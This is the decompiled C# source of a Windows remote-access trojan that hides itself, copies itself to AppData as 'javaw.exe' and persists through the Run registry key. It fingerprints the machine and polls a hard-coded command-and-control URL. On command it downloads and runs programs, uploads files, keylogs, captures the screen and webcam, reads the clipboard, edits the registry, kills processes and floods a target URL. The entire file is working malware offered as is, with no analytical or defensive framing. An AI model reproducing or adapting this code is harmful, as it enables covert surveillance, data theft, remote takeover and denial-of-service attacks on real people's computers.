using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

public class main : Form
{
	private IContainer icontainer_0;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	private string string_0 = "http://gr88cht.ddns.net/cra/bot.php";

	private string string_1 = "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";

	private int int_0 = 20000;

	private int int_1 = 10000;

	private int int_2;

	private int int_3;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string[] string_9 = new string[3];

	private string string_10;

	private string string_11;

	private int int_4;

	private int int_5;

	private string string_12;

	private int int_6;

	private string string_13;

	private bool bool_0;

	private int int_7;

	private string string_14 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static Bitmap bitmap_0;

	private static Graphics graphics_0;

	private WebBrowser webBrowser_0 = new WebBrowser();

	private WebClient webClient_0 = new WebClient();

	private WebClient webClient_1 = new WebClient();

	private string string_15;

	public main()
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		InitializeComponent();
		method_0();
	}

	[STAThread]
	private static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new main());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_1 = new Timer(icontainer_0);
		timer_1.set_Enabled(true);
		timer_1.set_Interval(1);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_0 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		timer_4 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		timer_0.set_Interval(1000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_2.set_Interval(10);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Interval(10);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		timer_4.add_Tick((EventHandler)timer_4_Tick);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).set_Name("main");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)main_Load);
		((Control)this).ResumeLayout(false);
	}

	private void method_0()
	{
		webClient_1.DownloadStringCompleted += webClient_1_DownloadStringCompleted;
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int SendMessage(int int_8, int int_9, int int_10, int int_11);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long long_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAnyncKeySync(long long_0);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_8);

	[DllImport("winmm.dll")]
	public static extern int mciSendString(string string_16, int int_8, int int_9);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_8);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_16, string string_17);

	[DllImport("user32.dll")]
	private static extern int FindWindow(string string_16, string string_17);

	[DllImport("user32.dll", EntryPoint = "ShowWindow")]
	private static extern int ShowWindow_1(int int_8, int int_9);

	[DllImport("avicap32.dll")]
	protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_16, int int_8, int int_9, int int_10, int int_11, int int_12, int int_13, int int_14);

	[DllImport("user32")]
	protected static extern int SetWindowPos(int int_8, int int_9, int int_10, int int_11, int int_12, int int_13, int int_14);

	[DllImport("user32")]
	protected static extern int SendMessageA(int int_8, int int_9, int int_10, [MarshalAs(UnmanagedType.AsAny)] object object_0);

	public void method_1(string string_16, string string_17)
	{
		try
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("receive", string_16);
			webClient_0.UploadValues(string_0 + "?id=" + string_2 + string_17, nameValueCollection);
		}
		catch
		{
		}
		timer_0.set_Interval(int_1);
		int_5 = 0;
	}

	private string method_2()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		string result = null;
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				if (((ManagementBaseObject)val3).get_Item("MACAddress") != null)
				{
					result = ((ManagementBaseObject)val3).get_Item("MACAddress").ToString()!.Replace(":", "");
				}
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private string method_3()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		double num = 0.0;
		ObjectQuery val = new ObjectQuery("select * from Win32_PhysicalMemory");
		ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
		ManagementObjectCollection val3 = val2.Get();
		ManagementObjectEnumerator enumerator = val3.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val4 = (ManagementObject)enumerator.get_Current();
				num += Convert.ToDouble(((ManagementBaseObject)val4).GetPropertyValue("Capacity"));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return (num / 1024.0 / 1024.0).ToString();
	}

	private string method_4()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		string result = null;
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToDecimal(((ManagementBaseObject)val3).get_Item("maxclockspeed")) / 1000m + "GHz ";
				result = result + ((ManagementBaseObject)val3).get_Item("datawidth").ToString() + "bit ";
				result += ((ManagementBaseObject)val3).get_Item("name").ToString();
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private int method_5()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		PictureBox val = new PictureBox();
		string string_ = Convert.ToString(0);
		int_2 = capCreateCaptureWindowA(ref string_, 1073741824, 0, 0, 640, 480, ((Control)val).get_Handle().ToInt32(), 0);
		return SendMessage(int_2, 1034, 0, 0);
	}

	private void main_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		try
		{
			File.Delete(string_14 + "\\javaw.exe");
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("javaw", string_14 + "\\javaw.exe");
			File.Copy(AppDomain.CurrentDomain.BaseDirectory + Path.GetFileName(Application.get_ExecutablePath()), string_14 + "\\javaw.exe");
		}
		catch
		{
		}
		string_2 = method_2();
		string_4 = Dns.GetHostName();
		string_3 = Environment.OSVersion.ToString();
		int num;
		timer_0.set_Interval(num = int_0);
		int_3 = num;
		string_5 = method_3();
		string_6 = method_4();
		string_7 = method_5().ToString();
		try
		{
			webClient_0.Headers["User-Agent"] = string_1;
			webClient_0.DownloadString(string_0 + "?id=" + string_2 + "&compname=" + string_4 + "&os=" + string_3 + "&interval=" + int_3 + "&memory=" + string_5 + "&processor=" + string_6 + "&webcam=" + string_7);
		}
		catch
		{
		}
		timer_0.Start();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		//IL_0e38: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e42: Expected O, but got Unknown
		//IL_116b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1186: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1293: Unknown result type (might be due to invalid IL or missing references)
		//IL_129a: Expected O, but got Unknown
		//IL_12a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ad: Expected O, but got Unknown
		//IL_12f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1300: Expected O, but got Unknown
		//IL_1386: Unknown result type (might be due to invalid IL or missing references)
		//IL_138d: Expected O, but got Unknown
		int_3 = timer_0.get_Interval();
		bool_0 = true;
		try
		{
			webClient_0.Headers["User-Agent"] = string_1;
			string_8 = webClient_0.DownloadString(string_0 + "?id=" + string_2 + "&compname=" + string_4 + "&os=" + string_3 + "&interval=" + int_3 + "&memory=" + string_5 + "&processor=" + string_6 + "&webcam=" + string_7);
			string_9 = string_8.Split(new char[1] { '|' });
			string_13 = "RS" + string_9[0];
			webClient_0.Headers["User-Agent"] = string_1;
			switch (string_9[0])
			{
			case "download":
				try
				{
					webClient_0.DownloadFile(string_9[1], string_9[2]);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "downloadexe":
			{
				string text3 = null;
				try
				{
					text3 = string_14 + "\\" + string_9[1].Substring(string_9[1].LastIndexOf("/") + 1);
					File.Delete(text3);
				}
				catch
				{
				}
				try
				{
					webClient_0.DownloadFile(string_9[1], text3);
					Process.Start(text3);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			}
			case "upload":
				try
				{
					string text7 = string_9[1].Substring(string_9[1].LastIndexOf("/") + 1);
					webClient_0.UploadFile(string_0 + "?id=" + string_2 + "&receive=upload&uploadtype=ufile&filename=" + text7, "POST", string_9[1]);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				bool_0 = false;
				break;
			case "run":
				try
				{
					Process.Start(string_9[1]);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "delete":
			{
				string text5 = string_9[1].Substring(string_9[1].Length - 1, 1);
				try
				{
					if (text5 == "/")
					{
						Directory.Delete(string_9[1], recursive: true);
					}
					else
					{
						File.Delete(string_9[1]);
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			}
			case "rename":
			{
				string text4 = string_9[1].Substring(string_9[1].Length - 1, 1);
				try
				{
					if (text4 == "/")
					{
						Directory.Move(string_9[1], string_9[2]);
					}
					else
					{
						File.Move(string_9[1], string_9[2]);
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			}
			case "creatdir":
				try
				{
					Directory.CreateDirectory(string_9[1]);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "ldos":
				try
				{
					string_15 = string_9[1];
					Uri address = new Uri(string_9[1]);
					int_7 = Convert.ToInt32(string_9[2]);
					webClient_1.DownloadStringAsync(address);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "list":
				string_13 = "LSlist{-f}";
				try
				{
					string[] directories = Directory.GetDirectories(string_9[1]);
					string[] files = Directory.GetFiles(string_9[1]);
					for (int l = 0; l < directories.Length; l++)
					{
						string_13 = string_13 + directories[l].Substring(directories[l].LastIndexOf("/") + 1) + "{-f}";
					}
					string_13 += "{-fbr}";
					for (int m = 0; m < files.Length; m++)
					{
						FileInfo fileInfo = new FileInfo(files[m]);
						object obj9 = string_13;
						string_13 = string.Concat(obj9, files[m].Substring(files[m].LastIndexOf("/") + 1), "{-fi}", fileInfo.Length.ToString(), "{-fi}", fileInfo.LastWriteTimeUtc, "{-f}");
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "programs":
			{
				string_13 = "LSprograms{-p}";
				string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
				using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name))
				{
					string[] subKeyNames2 = registryKey2.GetSubKeyNames();
					foreach (string name2 in subKeyNames2)
					{
						using RegistryKey registryKey3 = registryKey2.OpenSubKey(name2);
						try
						{
							if (registryKey3.GetValue("InstallLocation") != null && registryKey3.GetValue("DisplayName") != null)
							{
								object obj3 = string_13;
								string_13 = string.Concat(obj3, registryKey3.GetValue("DisplayName"), "{-pi}", registryKey3.GetValue("DisplayVersion"), "{-pi}", registryKey3.GetValue("Publisher"), "{-pi}", registryKey3.GetValue("UninstallString"), "{-p}");
							}
						}
						catch
						{
							string_13 = "RFprograms";
						}
					}
				}
				if (string_13.Contains("\""))
				{
					string_13 = string_13.Replace("\"", "");
				}
				break;
			}
			case "reglist":
				string_13 = "LSreglist{-l}";
				try
				{
					if (string_9[1].Contains("//"))
					{
						string_9[1] = string_9[1].Replace("//", "\\");
					}
					string[] subKeyNames = Registry.CurrentUser.OpenSubKey(string_9[1], writable: true)!.GetSubKeyNames();
					string[] array = subKeyNames;
					foreach (string text in array)
					{
						string_13 = string_13 + text + "{-l}";
					}
					string_13 += "{-lf}";
					string[] valueNames = Registry.CurrentUser.OpenSubKey(string_9[1], writable: true)!.GetValueNames();
					string[] array2 = valueNames;
					foreach (string text2 in array2)
					{
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_9[1], writable: true);
						object obj = string_13;
						string_13 = string.Concat(obj, text2, "{-li}", registryKey.GetValue(text2), "{-l}");
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "regnewkey":
				try
				{
					if (string_9[1].Contains("//"))
					{
						string_9[1] = string_9[1].Replace("//", "\\");
					}
					RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(string_9[1]);
					if (string_9[2] != "{-fol}")
					{
						registryKey4.SetValue(string_9[2], string_9[3]);
					}
					registryKey4.Close();
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "regdelkey":
				try
				{
					if (string_9[1].Contains("//"))
					{
						string_9[1] = string_9[1].Replace("//", "\\");
					}
					RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey(string_9[1]);
					if (string_9[3] != "{-fol}")
					{
						registryKey7.DeleteSubKey(string_9[2]);
					}
					else
					{
						registryKey7.DeleteValue(string_9[2]);
					}
					registryKey7.Close();
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "process":
			{
				string text8 = null;
				string_13 = "LS" + string_9[0] + "{-p}";
				try
				{
					Process[] processes2 = Process.GetProcesses();
					Process[] array4 = processes2;
					foreach (Process process2 in array4)
					{
						try
						{
							text8 = FileVersionInfo.GetVersionInfo(process2.MainModule!.FileName).FileDescription;
						}
						catch
						{
							text8 = null;
						}
						object obj32 = string_13;
						string_13 = string.Concat(obj32, process2.ProcessName, "{-pi}", process2.PrivateMemorySize, "{-pi}", text8, "{-p}");
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			}
			case "pkill":
				try
				{
					Process[] processes = Process.GetProcesses();
					Process[] array3 = processes;
					foreach (Process process in array3)
					{
						if (process.ProcessName == string_9[1])
						{
							process.Kill();
						}
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "clipboard":
				string_13 = "LS" + string_9[0] + "{-c}";
				string_13 += Clipboard.GetText();
				break;
			case "clipboardset":
				Clipboard.SetText(string_9[1]);
				break;
			case "startkl":
				timer_2.Start();
				break;
			case "stopkl":
				timer_2.Stop();
				int_4 = 0;
				break;
			case "screen":
				try
				{
					File.Delete(string_14 + "\\screen.png");
				}
				catch
				{
				}
				try
				{
					bitmap_0 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					graphics_0 = Graphics.FromImage((Image)(object)bitmap_0);
					graphics_0.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					((Image)bitmap_0).Save(string_14 + "\\screen.png", ImageFormat.get_Png());
					webClient_0.UploadFile(string_0 + "?id=" + string_2 + "&receive=upload&uploadtype=screen&filename=screen.png", "POST", string_14 + "\\screen.png");
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				bool_0 = false;
				break;
			case "computer":
				try
				{
					Process.Start(string_9[1], string_9[2]);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "cdrom":
				try
				{
					string text6 = "E";
					if (string_9.Length >= 3)
					{
						text6 = string_9[2];
					}
					mciSendString("OPEN " + text6 + ": TYPE CDaudio ALIAS DRIVEE", 0, 0);
					if (string_9[1] == "open")
					{
						mciSendString("SET DRIVE" + text6 + " DOOR OPEN", 0, 0);
					}
					else
					{
						mciSendString("SET DRIVE" + text6 + " DOOR CLOSED", 0, 0);
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "monitor":
				try
				{
					if (string_9[1] == "off")
					{
						SendMessage(((Control)this).get_Handle().ToInt32(), 274, 61808, 2);
					}
					else
					{
						SendMessage(((Control)this).get_Handle().ToInt32(), 274, 61808, -1);
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "icons":
				try
				{
					IntPtr intptr_ = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
					if (string_9[1] == "hide")
					{
						ShowWindow(intptr_, 0);
					}
					else
					{
						ShowWindow(intptr_, 5);
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "taskbar":
				try
				{
					int int_ = FindWindow("Shell_TrayWnd", "");
					if (string_9[1] == "hide")
					{
						ShowWindow_1(int_, 0);
					}
					else
					{
						ShowWindow_1(int_, 1);
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "message":
				try
				{
					switch (string_9[3])
					{
					case "error":
						MessageBox.Show(string_9[1], string_9[2], (MessageBoxButtons)0, (MessageBoxIcon)16);
						break;
					case "warning":
						MessageBox.Show(string_9[1], string_9[2], (MessageBoxButtons)0, (MessageBoxIcon)48);
						break;
					default:
						MessageBox.Show(string_9[1], string_9[2], (MessageBoxButtons)0, (MessageBoxIcon)64);
						break;
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "script":
				try
				{
					File.Delete(string_14 + "\\script." + string_9[1]);
				}
				catch
				{
				}
				try
				{
					StreamWriter streamWriter = new StreamWriter(string_14 + "\\script." + string_9[1]);
					streamWriter.Write(string_9[2]);
					streamWriter.Close();
					Process.Start(string_14 + "\\script." + string_9[1]);
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "print":
				try
				{
					int_6 = Convert.ToInt32(string_9[1]);
					if (int_6 == 0)
					{
						int_6 = 16;
					}
					string_12 = string_9[2];
					PrintDocument val4 = new PrintDocument();
					val4.add_PrintPage(new PrintPageEventHandler(method_6));
					val4.Print();
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				break;
			case "webcam":
			{
				try
				{
					File.Delete(string_14 + "\\webcam.jpg");
				}
				catch
				{
				}
				string string_ = Convert.ToString(0);
				PictureBox val = new PictureBox();
				IDataObject val2 = null;
				Image val3 = null;
				try
				{
					int_2 = capCreateCaptureWindowA(ref string_, 1073741824, 0, 0, 640, 480, ((Control)val).get_Handle().ToInt32(), 0);
					SendMessage(int_2, 1034, 0, 0);
					SendMessage(int_2, 1054, 0, 0);
					val2 = Clipboard.GetDataObject();
					if (val2.GetDataPresent(typeof(Bitmap)))
					{
						val3 = (Image)val2.GetData(typeof(Bitmap));
						val3.Save(string_14 + "\\webcam.jpg", ImageFormat.get_Jpeg());
						webClient_0.UploadFile(string_0 + "?id=" + string_2 + "&receive=upload&uploadtype=webcam&filename=webcam.jpg", "POST", string_14 + "\\webcam.jpg");
					}
				}
				catch
				{
					string_13 = "RF" + string_9[0];
				}
				bool_0 = false;
				break;
			}
			case "close":
				((Form)this).Close();
				break;
			case "regdel":
			{
				RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey6.DeleteValue("javaw");
				break;
			}
			case "uninstall":
			{
				RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey5.DeleteValue("javaw");
				((Form)this).Close();
				break;
			}
			case "mouse":
				if (string_9[1] == "enable")
				{
					timer_3.Start();
				}
				else
				{
					timer_3.Stop();
				}
				break;
			case "visitpage":
				webBrowser_0.Navigate(string_9[1]);
				break;
			case "ckeyboard":
				if (string_9[1] == "start")
				{
					timer_4.Start();
				}
				else
				{
					timer_4.Stop();
				}
				break;
			case "":
				if (int_5 >= 120)
				{
					timer_0.set_Interval(int_0);
				}
				else
				{
					int_5++;
				}
				bool_0 = false;
				break;
			default:
				bool_0 = false;
				break;
			}
			if (string_13.Contains("\\"))
			{
				string_13 = string_13.Replace("\\", "/");
			}
			if (bool_0)
			{
				method_1(string_13, "");
			}
		}
		catch
		{
		}
	}

	private void method_6(object sender, PrintPageEventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Expected O, but got Unknown
		Font val = new Font("Arial", (float)int_6);
		e.get_Graphics().DrawString(string_12, val, (Brush)new SolidBrush(Color.Blue), (float)(e.get_PageBounds().Right / 2), (float)(e.get_PageBounds().Bottom / 2));
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).Hide();
		timer_1.Stop();
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		int num = 256;
		for (int i = 1; i <= 255; i++)
		{
			int num2 = 0;
			num2 = GetAsyncKeyState(i);
			if (num2 == -32767 && i != 16 && i != 160 && i > 1)
			{
				switch (i)
				{
				case 13:
					string_11 += "{br}{ENTER}{br}";
					break;
				case 8:
					if (string_11.Substring(string_11.Length - 1, 1) != "}" && string_11.Length > 0)
					{
						string_11 = string_11.Substring(0, string_11.Length - 1);
					}
					break;
				case 9:
					string_11 += " {TAB} ";
					break;
				default:
				{
					StringBuilder stringBuilder = new StringBuilder(num);
					IntPtr foregroundWindow = GetForegroundWindow();
					if (GetWindowText(foregroundWindow, stringBuilder, num) > 0 && string_10 != foregroundWindow.ToString())
					{
						string_10 = foregroundWindow.ToString();
						string_11 = string_11 + "{br}{br}{br}--->" + stringBuilder.ToString() + " | ";
						string_11 = string_11 + DateTime.Now.ToLongTimeString() + "{br}";
					}
					string_11 += (char)i;
					break;
				}
				case 95:
					string_11 += "_";
					break;
				case 64:
					string_11 += "@";
					break;
				}
			}
			int_4++;
			if (int_4 >= 6000000)
			{
				int_4 = 0;
				method_1(string_11, "&kl=true");
				string_11 = null;
			}
		}
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		Cursor.set_Position(new Point(0, 0));
	}

	private void webClient_1_DownloadStringCompleted(object sender, EventArgs e)
	{
		Uri address = new Uri(string_15);
		if (int_7 > 0)
		{
			webClient_1.DownloadStringAsync(address);
			int_7--;
		}
		else
		{
			method_1("DDos finished", "");
		}
	}

	private void timer_4_Tick(object sender, EventArgs e)
	{
		SendKeys.Send("w");
	}
}
